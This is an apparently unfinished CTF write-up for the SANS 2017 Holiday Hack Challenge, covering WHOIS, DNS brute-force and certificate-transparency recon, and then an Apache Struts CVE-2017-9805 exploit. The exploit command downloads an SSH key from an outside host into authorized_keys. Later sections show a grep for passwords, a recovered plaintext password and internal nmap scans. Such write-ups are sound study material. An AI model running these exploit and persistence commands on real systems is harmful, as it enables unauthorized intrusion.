#+TITLE: SANS 2017 Holiday Hack Writeup
#+AUTHOR: Vlad Grigorescu
#+EMAIL: vladg@illinois.edu
#+OPTIONS: timestamp:nil num:nil ^:nil toc:2 exports:both
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/readtheorg.css"/>
#+HTML_HEAD: <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
#+HTML_HEAD: <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
#+HTML_HEAD: <script type="text/javascript" src="js/readtheorg.js"></script>
#+HTML_HEAD: <style>#content{max-width:1200px;}</style>
* Introduction
* Answers
* Pre-contest Reconnaissance
#+CAPTION: SANS Holiday Hack Challenge December 5th Update
[[./images/sans_holiday_hack_preview.png]]

On December 5th, the SANS Holiday Hack Challenge was updated to tell
us that the 2017 Hack was coming soon, and encouraging us to catch up
on past challenges. The next day, we started doing just that. In
addition to reviewing previous challenges, we also began some
reconnaissance for the 2017 challenge.

Recon is a crucial step of any good penetration test, and is one that
often gets skipped in a "Capture the Flag" type of competition, since
most of the information is provided. Nevertheless, let's see what we
can find. The more information we have ahead of time, the better
prepared we'll be, and the less work we'll have to do during the
actual contest.

Much like how attackers will have indicators of compromise (IOCs)
which allow us to track and follow an individual attacker, the Counter
Hack team also does similar things every year, and will leave behind
some clues.

** Whois Searching
 For example, the 2016 contest made use of the domain
 www.northpolewonderland.com. We can look at publicly available WHOIS
 data for that domain:

 #+BEGIN_SRC sh
 whois northpolewonderland.com | grep Registrant
 #+END_SRC

 #+BEGIN_EXAMPLE
 Registrant Name: Edward Skoudis
 Registrant Organization: Counter Hack
 Registrant Street: 2402 Alexandra Court
 Registrant City: Howell
 Registrant State/Province: New Jersey
 Registrant Postal Code: 07731
 Registrant Country: US
 Registrant Phone: +1.7327511024
 Registrant Phone Ext:
 Registrant Fax: +1.7327511024
 Registrant Fax Ext:
 Registrant Email: edskoudis@yahoo.com
 #+END_EXAMPLE

 There are a few services that allow you to do a "reverse WHOIS"
 search, to search for domains by WHOIS data. For instance to search
 for other domains where "edskoudis@yahoo.com" shows up in the contact
 info: 

 | Domain Name                      | Creation Date | Registrar               |
 |----------------------------------+---------------+-------------------------|
 | northpolechristmastown.com       |    2017-10-19 | GODADDY.COM, LLC        |
 | 1hrctf.com                       |    2016-04-08 | GODADDY.COM, LLC        |
 | 1hrctf.org                       |    2016-04-08 | GODADDY.COM, LLC        |
 | cranbian.org                     |    2016-11-22 | GODADDY.COM, LLC        |
 | hackfestchallenge.com            |    2016-10-20 | GODADDY.COM, LLC        |
 | onehourctf.org                   |    2016-04-08 | GODADDY.COM, LLC        |
 | atnascorp.com                    |    2015-11-10 | GODADDY.COM, LLC        |
 | ginormouselectronicssupplier.com |    2015-12-09 | GODADDY.COM, LLC        |
 | holidayhackchallenge.com         |    2015-11-02 | GODADDY.COM, LLC        |
 | holidayhackchallenge.org         |    2015-11-02 | GODADDY.COM, LLC        |
 | digimeme.org                     |    2013-11-18 | GODADDY.COM, LLC        |
 | syn-pi.org                       |    2013-11-18 | GODADDY.COM, LLC        |
 | pseudovision.net                 |    2010-09-09 | GODADDY.COM, LLC        |
 | counterhack.net                  |    2001-06-22 | NETWORK SOLUTIONS, LLC. |
 | skoudis.com                      |    2001-06-22 | NETWORK SOLUTIONS, LLC. |
 | counterhack.com                  |    2000-05-30 | GODADDY.COM, LLC        |

 This isn't comprehensive, since northpolewonderland.com didn't show up
 in the results, but cranbian.org was another domain from 2016 that
 does show up.

 There are a couple of new entries since the 2016 contest, 1hrctf and
 northpolechristmastown.com. 1hrctf seems unrelated, but it's a good
 bet that northpolechristmastown.com will show up in the 2017
 challenge.

 At this point, we have to proceed with extreme caution. Since the
 contest hasn't started, nothing is in scope yet. Any further digging
 should be as unintrusive as possible.

** DNS Brute Forcing
 Now that we have a domain we're interested in, let's look at DNS:

 #+BEGIN_SRC sh
 dig ANY northpolechristmastown.com
 #+END_SRC

 #+BEGIN_EXAMPLE
 ;; ANSWER SECTION:
 northpolechristmastown.com. 5	IN	TXT	"v=spf1 include:_spf.google.com -all"
 northpolechristmastown.com. 5	IN	MX	30 ALT2.ASPMX.L.GOOGLE.com.
 northpolechristmastown.com. 5	IN	MX	40 ASPMX2.GOOGLEMAIL.com.
 northpolechristmastown.com. 5	IN	MX	20 ALT1.ASPMX.L.GOOGLE.com.
 northpolechristmastown.com. 5	IN	MX	50 ASPMX3.GOOGLEMAIL.com.
 northpolechristmastown.com. 5	IN	MX	10 ASPMX.L.GOOGLE.com.
 northpolechristmastown.com. 5	IN	SOA	ns53.domaincontrol.com. dns.jomax.net. 2017120112 28800 7200 604800 600
 northpolechristmastown.com. 5	IN	NS	ns54.domaincontrol.com.
 northpolechristmastown.com. 5	IN	NS	ns53.domaincontrol.com.
 #+END_EXAMPLE

 From this, we can tell that GMail provides the e-mail for the domain,
 and GoDaddy provides the DNS service. Of note, however, is that there
 are no A or AAAA records, so northpolechristmastown.com does not
 resolve to anything.

 Next, we'll try some Google dorking. Googling for
 site:northpolechristmastown.com reveals
 nppd.northpolechristmastown.com, which is a Sign In page for the
 North Pole Police Department. It looks like nppd uses Google OAuth
 for authentication, and most pages are forbidden with a regular GMail
 account.

 Checking a few other common URLs on nppd, we can find some resources
 that are available, including favicon.ico and robots.txt:
 #+BEGIN_SRC
 User-agent: hk-47
 Disallow: /
 Disallow: /needhelp
 Disallow: /infractions
 Disallow: /community
 Disallow: /about

 User-agent: threepio
 Sand-Crawler-delay: 421

 User-agent: artoo
 Sand-Crawler-delay: 2187
 #+END_SRC

#+CAPTION: North Pole Police Department Logo
[[./images/nppd_star.png]]

 Everything here but /infractions is forbidden. Looking at that page
 returns a list of infractions, such as "Unauthorized access to cookie
 jar" or "Computer infraction: Accessing siblings files without
 permission." We also see some interesting infractions that refer to
 previous Holiday Hacks:

 #+BEGIN_EXAMPLE
	 {
             "date": "2016-12-25T00:00:00",
             "name": "Dr. Who",
             "severity": 5.0,
             "status": "closed",
             "title": "Trying to ruin Christmas"
         },
	 {
             "date": "2015-12-25T00:00:00",
             "name": "Cindy Lou Who",
             "severity": 5.0,
             "status": "closed",
             "title": "Trying to ruin Christmas"
         }
     ],
     "query": "name:Who"
 #+END_EXAMPLE

 Going back to DNS< we can try to enumerate some hosts under the top
 level domain. FuzzDB has a nice list of common DNS name, and we can
 use an nmap script to try to query those:

 #+BEGIN_SRC sh
 $ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
 #+END_SRC

 #+BEGIN_EXAMPLE
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-06 18:54 CST
 Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
 NSE Timing: About 0.00% done
 Pre-scan script results:
 | dns-brute:
 |   DNS Brute-force hostnames:
 |     intranet.northpolechristmastown.com - 35.196.239.128
 |     files.northpolechristmastown.com - 35.185.43.23
 |     dev.northpolechristmastown.com - 35.185.84.51
 |     admin.northpolechristmastown.com - 35.185.115.185
 |_    mail.northpolechristmastown.com - 35.185.115.185
 #+END_EXAMPLE

A couple of other lists resulted in the following hostnames as well:

#+BEGIN_EXAMPLE
|   DNS Brute-force hostnames:
|     emi.northpolechristmastown.com - 35.185.57.190
|_    ewa.northpolechristmastown.com - 35.185.115.185
#+END_EXAMPLE

** Certificate Transparency Logs

 Next, let's turn our attention to the holidayhackchallenge.com
 domain. Last year, there were some new hosts that appeared under this
 domain (e.g. quest2016.holidayhackchallenge.com). Brute-forcing this
 will likely not get us very far, so let's try a different approach:
 certificate transparency logs. Many certificate authorities maintain
 transparency systems, so that issued certificates can be publicly
 reviewd. Symantec, for instance, has a free tool that will search the
 logs of several certificate authorities:

#+CAPTION: Symantec Crypto Report for holidayhackchallenge.com
[[./images/recon_crypto_report.png]]

Searching for holidayhackchallenge.com reveals the following
certificates that don't look familiar:

 | Common Name                         | Subject Alternate Names (SANs) |             IP |
 |-------------------------------------+--------------------------------+----------------|
 | 2017.holidayhackchallenge.com       | 2017, puzzler2017              |  35.196.67.150 |
 | docker2017.holidayhackchallenge.com |                                | 35.190.163.207 |
 | chat.holidayhackchallenge.com       |                                |  35.196.73.180 |

** Monitoring

None of the 3 servers listed above are currently accessible on port 80
or 443 (HTTP and HTTPS). We setup some monitoring using a free online
service (uptimerobot.com). Every 5 minutes, it would try to connect to
HTTP and HTTPs on the 3 servers listed above. Once the systems become
available, it will text us and post a message to our Slack channel.

Once that happens, the hack is on, and we'll be ready to hit the
ground running.

** Recon Summary

We can use the following indicators to search any clues we're later provided with:

| Indicator                            | Type      | Source                 |
|--------------------------------------+-----------+------------------------|
| northpolechristmastown.com           | Domain    | Reverse WHOIS          |
| holidayhackchallenge.com             | Domain    | 2016 Hack              |
| nppd.northpolechristmastown.com      | FQDN      | Google Search          |
| intranet.northpolechristmastown.com  | FQDN      | DNS Brute Force        |
| files.northpolechristmastown.com     | FQDN      | DNS Brute Force        |
| dev.northpolechristmastown.com       | FQDN      | DNS Brute Force        |
| admin.northpolechristmastown.com     | FQDN      | DNS Brute Force        |
| mail.northpolechristmastown.com      | FQDN      | DNS Brute Force        |
| emi.northpolechristmastown.com       | FQDN      | DNS Brute Force        |
| ewa.northpolechristmastown.com       | FQDN      | DNS Brute Force        |
| 2017.holidayhackchallenge.com        | FQDN      | Cert Transparency      |
| puzzler2017.holidayhackchallenge.com | FQDN      | Cert SAN               |
| docker2017.holidayhackchallenge.com  | FQDN      | Cert Transparency      |
| chat.holidayhackchallenge.com        | FQDN      | Cert Transparency      |
| 35.185.43.23                         | IP        | DNS (files)            |
| 35.185.57.190                        | IP        | DNS (emi)              |
| 35.185.84.51                         | IP        | DNS (dev)              |
| 35.185.115.185                       | IP        | DNS (admin, mail, ewa) |
| 35.190.163.207                       | IP        | DNS (docker2017)       |
| 35.196.67.150                        | IP        | DNS (2017)             |
| 35.196.73.18                         | IP        | DNS (chat)             |
| 35.196.239.128                       | IP        | DNS (intranet)         |
| HK-47 (Star Wars Droid)              | Reference | nppd robots.txt        |
| Artoo (Star Wars Droid)              | Reference | nppd robots.txt        |
| Threepio (Star Wars Droid)           | Reference | nppd robots.txt        |
| Sand-Crawler (Star Wars Vehicle)     | Reference | nppd robots.txt        |
| North Pole Police Department         | Reference | nppd /infractions      |
| Cindy Lou Who (2015 Hack)            | Reference | nppd /infractions      |
| Dr. Who (2016 Hack)                  | Reference | nppd /infractions      |

* Let the Hack Begin!
** Gaining Access to L2S
The SAN cert showed it the was the same as dev.northpolechristmastown.com.

TODO: Justin - how did you figure out it was Struts?

Used the Python tool in the SANS blog post:

#+BEGIN_SRC sh
python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'
#+END_SRC

*** Finding the password for alabaster_snowball 

Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
Start small and double the filesize each time to keep the process fast.

#+BEGIN_SRC sh
alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -1k 2>/dev/null |xargs grep passwor
alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -2k 2>/dev/null |xargs grep passwor
alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -4k 2>/dev/null |xargs grep passwor
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = "stream_unhappy_buy_loss";
#+END_SRC


#+BEGIN_SRC sh
ssh l2s | tee nmap.out
#+END_SRC

#+BEGIN_SRC 
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-15 02:26 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http     nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.3
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  ssl/http nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-29T12:54:54
| Not valid after:  2018-02-27T12:54:54
| MD5:   90b5 5b73 6e21 e00f 0247 b22d a1ec f953
|_SHA-1: c089 30bf cd61 3a55 ea8f f419 2542 b9b4 9823 8fb1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00021s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ac:cc:7c:b1:cb:56:0b:bc:cd:05:12:36:e7:24:ca (RSA)
|_  256 9f:4e:9a:ee:dc:ef:f4:4b:6d:1b:03:58:bb:5d:a2:87 (ECDSA)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap    Dovecot imapd
|_imap-capabilities: OK ID IDLE LITERAL+ AUTH=PLAIN more have capabilities listed post-login LOGIN-REFERRALS Pre-login AUTH=LOGINA0001 ENABLE SASL-IR IMAP4rev1
2525/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 33:fb:b7:35:b5:7a:72:6f:06:91:21:ff:e2:3e:86:79 (RSA)
|_  256 70:71:ea:71:cd:83:d8:47:29:ef:6f:69:f3:8a:ed:a2 (ECDSA)
80/tcp   open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: nginx/1.10.3
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  open  ldap
| fingerprint-strings: 
|   LDAPBindReq: 
|     Version 2 not supported
|   LDAPSearchReq: 
|     supportedLDAPVersion1
|     namingContexts1
|     dc=com0/
|     supportedExtension1
|_    1.3.6.1.4.1.4203.1.11.10
8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port389-TCP:V=7.40%I=7%D=12/15%Time=5A3332D9%P=x86_64-pc-linux-gnu%r(LD
SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00081s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
| Issuer: commonName=hhc17-smb-server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-06T13:46:55
| Not valid after:  2018-05-08T13:46:55
| MD5:   092f 018a 083a b87a 8186 ecac da4e 09e2
|_SHA-1: 0a0d f4e6 765f 1818 cd32 4bf2 5212 e8ca ef51 5c38
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00089s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Issuer: commonName=hhc17-elf-manufacturing
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-23T20:53:55
| Not valid after:  2018-05-25T20:53:55
| MD5:   a711 f240 0c9e a8cd 3be4 81fa fa16 f15a
|_SHA-1: 5728 6c5d 2ec0 6657 629b f9f4 72aa 0b3d 12d4 b3a5
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
#+END_SRC
